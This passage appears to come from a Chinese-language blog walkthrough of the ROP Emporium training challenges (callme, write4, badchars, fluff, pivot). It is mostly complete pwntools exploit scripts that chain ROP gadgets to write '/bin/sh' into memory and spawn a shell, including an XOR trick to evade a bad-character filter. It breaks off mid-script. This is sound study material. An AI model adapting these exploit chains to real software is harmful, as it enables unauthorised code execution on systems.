punctuation">]</span>pop_rdi_rsi_rdx_addr <span class="token operator">=</span> <span class="token number">0x0000000000401ab0</span>payload <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> overflowpayload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_rsi_rdx_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>callme_one_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_rsi_rdx_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>callme_two_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_rsi_rdx_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>callme_three_addr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="/images/14/callme/2.jpg" alt></p><h2 id="write4"><a href="#write4" class="headerlink" title="write4"></a>write4</h2><h5 id="32位-3"><a href="#32位-3" class="headerlink" title="32位:"></a><a href="https://ropemporium.com/binary/write432.zip" target="_blank" rel="noopener">32位</a>:</h5><p>这个挑战给了<code>system</code>但是没有给<code>/bin/cat flag.txt</code>, 则需要自己写一段进去, 这里打算直接写个<code>/bin/sh</code>, 但是往哪里写呢？</p><p>通过<code>readelf</code>工具查看段.<br><img src="/images/14/write4/1.jpg" alt></p><p>可以看到<code>.data</code>和<code>.bss</code>段都有可读写的权限, 这里就可以把<code>/bin/sh</code>写到<code>.data</code>段内, 要写入的长度是7, data段大小是8, 刚好可以装下.</p><p>要想写入数据到里面, 需要使用<code>mov</code>指令, 于是找到了</p><pre><code>0x080486da : pop edi ; pop ebp ; ret0x08048670 : mov dword ptr [edi], ebp ; ret</code></pre><p>这两条指令就可以满足我们写入数据到内存的想法.  由于这是32位的程序, 每次只能写入4个字节, 而<code>/bin/sh</code>是7个字节, 于是我们要分两次进行写入。 </p><p>那? Go?</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./write432"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./write432"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># var</span>overflow <span class="token operator">=</span> <span class="token number">0x28</span> <span class="token operator">+</span> <span class="token number">4</span>system_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>data_addr <span class="token operator">=</span> <span class="token number">0x0804a028</span>pop_edi_ebp_addr <span class="token operator">=</span> <span class="token number">0x080486da</span>mov_edi_ebp <span class="token operator">=</span> <span class="token number">0x08048670</span>bin_sh_str <span class="token operator">=</span> <span class="token string">"/bin/sh"</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">"\0"</span><span class="token punctuation">)</span>left_bin_sh <span class="token operator">=</span> bin_sh_str<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span>right_bin_sh <span class="token operator">=</span> bin_sh_str<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span>payload <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> overflowpayload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_edi_ebp_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>data_addr<span class="token punctuation">)</span> <span class="token operator">+</span> left_bin_sh <span class="token operator">+</span> p32<span class="token punctuation">(</span>mov_edi_ebp<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_edi_ebp_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>data_addr <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> right_bin_sh <span class="token operator">+</span> p32<span class="token punctuation">(</span>mov_edi_ebp<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>data_addr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="/images/14/write4/2.jpg" alt></p><h5 id="64位-3"><a href="#64位-3" class="headerlink" title="64位:"></a><a href="https://ropemporium.com/binary/write4.zip" target="_blank" rel="noopener">64位</a>:</h5><p>思路和32位一样, 不过64位要更简单一些, 因为可以一次性直接把<code>/bin/sh</code>写进去, 不用分开写入了.</p><p>找到需要的<code>gadget</code></p><pre><code>0x0000000000400893 : pop rdi ; ret0x0000000000400890 : pop r14 ; pop r15 ; ret0x0000000000400820 : mov qword ptr [r14], r15 ; ret</code></pre><p>开始编写exp</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./write4"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./write4"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># var</span>overflow <span class="token operator">=</span> <span class="token number">0x20</span> <span class="token operator">+</span> <span class="token number">8</span>system_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>pop_rdi_addr <span class="token operator">=</span> <span class="token number">0x0000000000400893</span>data_addr <span class="token operator">=</span> <span class="token number">0x0000000000601050</span>mov_r14_r15_addr <span class="token operator">=</span> <span class="token number">0x0000000000400820</span>pop_r14_15_addr <span class="token operator">=</span> <span class="token number">0x0000000000400890</span>bin_sh_str <span class="token operator">=</span> <span class="token string">"/bin/sh"</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">"\0"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> overflowpayload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_r14_15_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>data_addr<span class="token punctuation">)</span> <span class="token operator">+</span> bin_sh_str <span class="token operator">+</span> p64<span class="token punctuation">(</span>mov_r14_r15_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>data_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="/images/14/write4/3.jpg" alt></p><h2 id="badchars"><a href="#badchars" class="headerlink" title="badchars"></a>badchars</h2><h5 id="32位-4"><a href="#32位-4" class="headerlink" title="32位:"></a><a href>32位</a>:</h5><p>程序禁止输入<code>b i c / &lt;space&gt; f n s</code>, 可以通过异或后的结果来把<code>/bin/sh</code>写到程序, 再通过<code>gadget</code>把<code>/bin/sh</code>异或回来, 再进行执行.</p><p>首先要得出异或哪个数字可以通过这个黑名单, 写个脚本跑跑.</p><pre class=" language-python"><code class="language-python">blackList <span class="token operator">=</span> <span class="token punctuation">[</span>ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">"b"</span><span class="token punctuation">,</span> <span class="token string">"i"</span><span class="token punctuation">,</span> <span class="token string">"c"</span><span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"f"</span><span class="token punctuation">,</span> <span class="token string">"n"</span><span class="token punctuation">,</span>  <span class="token string">"s"</span><span class="token punctuation">]</span><span class="token punctuation">]</span>bin_sh <span class="token operator">=</span> <span class="token string">"/bin/sh"</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">"\0"</span><span class="token punctuation">)</span>result <span class="token operator">=</span> <span class="token string">""</span><span class="token comment" spellcheck="true"># 测试从1异或到20 看看哪个数字可以使用</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> bin_sh<span class="token punctuation">:</span>        <span class="token keyword">if</span> ord<span class="token punctuation">(</span>item<span class="token punctuation">)</span> <span class="token operator">^</span> i <span class="token keyword">in</span> blackList<span class="token punctuation">:</span>            <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            result <span class="token operator">+=</span> item            <span class="token keyword">if</span> len<span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">8</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    result <span class="token operator">=</span> <span class="token string">""</span></code></pre><p>执行完毕可以发现<code>2 3 5 9 18 19</code>之类的都可以用, 然后直接用个最小的就可以.</p><p>开始编写exp</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./badchars32"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./badchars32"</span><span class="token punctuation">)</span>overflow <span class="token operator">=</span> cyclic_find<span class="token punctuation">(</span><span class="token string">"laaa"</span><span class="token punctuation">)</span>xor_num <span class="token operator">=</span> <span class="token number">2</span>bin_sh <span class="token operator">=</span> list<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">"\0"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>data_addr <span class="token operator">=</span> <span class="token number">0x0804a038</span>system_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>mov_edi_esi_ret <span class="token operator">=</span> <span class="token number">0x08048893</span>pop_esi_edi_ret <span class="token operator">=</span> <span class="token number">0x08048899</span>pop_ebx_ecx_ret <span class="token operator">=</span> <span class="token number">0x08048896</span>xor_ebx_ecx_ret <span class="token operator">=</span> <span class="token number">0x08048890</span><span class="token comment" spellcheck="true"># xor encode</span><span class="token keyword">for</span> index<span class="token punctuation">,</span> item <span class="token keyword">in</span> enumerate<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span><span class="token punctuation">:</span>    bin_sh<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> chr<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>item<span class="token punctuation">)</span> <span class="token operator">^</span> xor_num<span class="token punctuation">)</span>bin_sh <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> overflow<span class="token comment" spellcheck="true"># write "/bin" to data</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_esi_edi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> bin_sh<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>data_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>mov_edi_esi_ret<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># write "/sh" to data</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_esi_edi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> bin_sh<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>data_addr <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>mov_edi_esi_ret<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># decode xor</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_ebx_ecx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>data_addr <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>xor_num<span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>xor_ebx_ecx_ret<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># system(/bin/sh)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>data_addr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="/images/14/badchars/1.jpg" alt></p><h5 id="64位-4"><a href="#64位-4" class="headerlink" title="64位:"></a><a href="https://ropemporium.com/binary/badchars.zip" target="_blank" rel="noopener">64位</a>:</h5><p>和32位一样思路, 只是找到<code>gadget</code>不一样, 还要注意要比32位程序多用一个<code>pop rdi; ret</code>.</p><p>exp:</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./badchars"</span><span class="token punctuation">)</span>xor_num <span class="token operator">=</span> <span class="token number">2</span>binsh <span class="token operator">=</span> <span class="token string">'/bin/sh\x00'</span>xorbinsh <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> binsh<span class="token punctuation">:</span>    a <span class="token operator">=</span> ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">^</span> xor_num    xorbinsh <span class="token operator">+=</span> chr<span class="token punctuation">(</span>a<span class="token punctuation">)</span>overflow <span class="token operator">=</span> cyclic_find<span class="token punctuation">(</span><span class="token string">"kaaa"</span><span class="token punctuation">)</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0000000000400b39</span>pop_r12_r13_ret <span class="token operator">=</span> <span class="token number">0x0000000000400b3b</span>mov_r13_r12_ret <span class="token operator">=</span> <span class="token number">0x0000000000400b34</span>pop_r14_r15_ret <span class="token operator">=</span> <span class="token number">0x0000000000400b40</span>xor_r15_r14_ret <span class="token operator">=</span> <span class="token number">0x0000000000400b30</span>bss_addr <span class="token operator">=</span> <span class="token number">0x601080</span>system_addr <span class="token operator">=</span> <span class="token number">0x4006f0</span>payload <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> overflowpayload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_r12_r13_ret<span class="token punctuation">)</span> <span class="token operator">+</span> xorbinsh <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>mov_r13_r12_ret<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>xorbinsh<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_r14_r15_ret<span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>xor_num<span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bss_addr <span class="token operator">+</span> i<span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>xor_r15_r14_ret<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="/images/14/badchars/2.jpg" alt></p><h2 id="fluff"><a href="#fluff" class="headerlink" title="fluff"></a>fluff</h2><h5 id="32位-5"><a href="#32位-5" class="headerlink" title="32位:"></a><a href="https://ropemporium.com/binary/fluff32.zip" target="_blank" rel="noopener">32位</a>:</h5><p>看介绍, 就是<code>write4</code>的升级版, 肯定是要找一条可以把寄存器的值写入到内存地址上的指令, </p><pre><code>0x08048693 : mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret</code></pre><p>但是没找到<code>pop ecx; pop edx; ret</code>之类的操作</p><p>可是…可以发现一条</p><pre><code>0x080485f3 : popal ; cld ; ret</code></pre><p>第一次遇到这个指令, 去搜了一下, 可以从栈上弹到所有寄存器,<br>顺序是<code>%edi-&gt;%esi-&gt;%ebp-&gt;%esp-&gt;%ebx-&gt;%edx-&gt;%ecx-&gt;%eax</code><br>也就是相当于</p><pre><code>pop edi;pop esi;pop ebp;pop esp;pop ebx;pop edx;pop ecx;pop eax;</code></pre><p>这样我们只需要随便填充其他的寄存器, 然后把<code>ecx, edx</code>寄存器填写成我们需要的内容就可以了.</p><p>为了减少代码量, 我们还可以写个函数.</p><p>直接上exp</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./fluff32"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># var</span>offset <span class="token operator">=</span> <span class="token number">44</span>bss_addr <span class="token operator">=</span> <span class="token number">0x0804a040</span>bin_sh <span class="token operator">=</span> <span class="token string">"/bin/sh"</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">"\0"</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> <span class="token number">0x0804865A</span>popal <span class="token operator">=</span> <span class="token number">0x080485f3</span> <span class="token comment" spellcheck="true"># %edi->%esi->%ebp->%esp->%ebx->%edx->%ecx->%eax</span>mov_ecx_edx <span class="token operator">=</span> <span class="token number">0x08048693</span> <span class="token comment" spellcheck="true"># 2  mov [ecx], edx</span><span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span> offset<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>popal<span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> text  <span class="token comment" spellcheck="true"># edx</span>    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>bss_addr <span class="token operator">+</span> offset<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># ecx</span>    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>mov_ecx_edx<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> payloadpayload <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> offsetpayload <span class="token operator">+=</span> write<span class="token punctuation">(</span>bin_sh<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> write<span class="token punctuation">(</span>bin_sh<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="/images/14/fluff/1.jpg" alt></p><h5 id="64位-5"><a href="#64位-5" class="headerlink" title="64位:"></a><a href="https://ropemporium.com/binary/fluff.zip" target="_blank" rel="noopener">64位</a>:</h5><p>只要搞明白, 0 与 正数进行异或, 得到的结果就是那个正数, 可以通过这个方法间接给一个寄存器赋值.</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./fluff"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># var</span>offset <span class="token operator">=</span> <span class="token number">0x28</span>system_addr <span class="token operator">=</span> <span class="token number">0x4005E0</span>bss_addr <span class="token operator">=</span> <span class="token number">0x0000000000601060</span>pop_rdi <span class="token operator">=</span> <span class="token number">0x00000000004008c3</span>  <span class="token comment" spellcheck="true"># pop rdi; ret</span>xor_r11_r11 <span class="token operator">=</span> <span class="token number">0x0000000000400822</span>  <span class="token comment" spellcheck="true"># xor r11, r11; pop; ? ret</span>pop_r12 <span class="token operator">=</span> <span class="token number">0x0000000000400832</span> <span class="token comment" spellcheck="true"># pop r12 ; ?; ret</span>xor_r11_r12 <span class="token operator">=</span> <span class="token number">0x000000000040082F</span> <span class="token comment" spellcheck="true"># xor r11, r12; pop; ?; ret</span>mov_r10_r11 <span class="token operator">=</span> <span class="token number">0x000000000040084E</span>   <span class="token comment" spellcheck="true"># mov [r10], r11; pop r13; pop r12; xor [r10], r12b; ret</span>xchg_r10_r11 <span class="token operator">=</span> <span class="token number">0x0000000000400840</span>  <span class="token comment" spellcheck="true"># xchg; pop; ?; ret</span>bin_sh <span class="token operator">=</span> <span class="token string">"/bin/sh"</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">"\0"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># A == 0   ->   A ^= ?   ->  A = ?</span><span class="token triple-quoted-string string">""">>> r11 = 100>>> r11 ^= r11>>> r110>>> r12 = 200>>> r11 ^= r12>>> r11200"""</span>payload <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> offset<span class="token comment" spellcheck="true"># bin/sh  ->  bss</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>xor_r11_r11<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># r11 = 0</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_r12<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># r12 = bss_addr</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>xor_r11_r12<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># r11 = r12 = bss_addr</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>xchg_r10_r11<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true"># r10 = 0   ->   r10 = r11 = r12 = bss_addr</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>xor_r11_r11<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># r11 = 0</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_r12<span class="token punctuation">)</span> <span class="token operator">+</span> bin_sh           <span class="token comment" spellcheck="true"># r12 = /bin/sh </span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>xor_r11_r12<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># r11 = 0   ->   r11 = r12 = /bin/sh</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>mov_r10_r11<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># mov [bss], /bin/sh</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># bss_addr = /bin/sh</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>                <span class="token comment" spellcheck="true"># system(bss_addr) = system(/bin/sh)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="/images/14/fluff/2.jpg" alt></p><h2 id="pivot"><a href="#pivot" class="headerlink" title="pivot"></a>pivot</h2><h6 id="32位-6"><a href="#32位-6" class="headerlink" title="32位:"></a><a href="https://ropemporium.com/binary/pivot32.zip" target="_blank" rel="noopener">32位</a>:</h6><p>分析一下题目, 有两个输入的地方,<br>第一次输入会输入到<code>堆</code>中, 也就是程序打印那个地址.<br>第二次输入就是要溢出了, 但是给我们构造ROP链的大小只有<code>0xb</code>. 肯定不够我们构造复杂的ROP链的, 所以我们要进行<code>栈迁移</code>.</p><p>题目给了<code>libcpivot32.so</code>, 分析了一下可以看到<code>ret2win</code>函数和<code>foothold_function</code>, 可以通过泄露<code>foothold_function</code>的地址计算出<code>ret2win</code>的实际地址并执行.</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> timep <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./pivot32"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pivot32"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"libpivot32.so"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># var</span>overflow <span class="token operator">=</span> <span class="token number">0x28</span> <span class="token operator">+</span> <span class="token number">4</span>                                <span 